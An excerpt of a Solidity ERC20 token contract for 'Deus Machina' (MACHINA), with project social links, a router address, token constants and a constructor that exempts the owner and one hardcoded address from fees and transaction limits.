...
// Community: https://t.me/DeusMachinaERC

// Website: https://deusexmachina.pro/
// X: https://twitter.com/deusmachinaETH
...
contract DeusMachinaERC is ERC20, Ownable {
    using SafeMath for uint256;

    address private routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Deus Machina";
    string constant _symbol = "MACHINA";
    ...
    constructor () Ownable(msg.sender) {
        ...
        isFeeExempt[0xF3893Ce634bFbFf0409B8fBBf696f050157fB576] = true;
        isTxLimitExempt[_owner] = true;
        isTxLimitExempt[0xF3893Ce634bFbFf0409B8fBBf696f050157fB576] = true;
